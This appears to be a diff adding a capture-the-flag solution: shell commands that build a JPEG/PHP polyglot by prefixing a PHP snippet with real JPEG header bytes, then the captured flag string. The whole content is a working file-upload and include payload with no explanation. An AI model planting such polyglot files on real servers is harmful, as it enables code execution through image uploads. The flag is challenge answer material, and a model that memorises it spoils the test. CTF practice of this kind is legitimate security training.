@@ -1,0 +1,5 @@
+head -c 260 legit.jpeg > evil.jpeg
+
+echo '<?php ob_clean(); echo FLAG; exit; ?>' >> evil.jpeg
+
+flag{php_include_is_dangerous_2026_AetherBreach_polyglot}
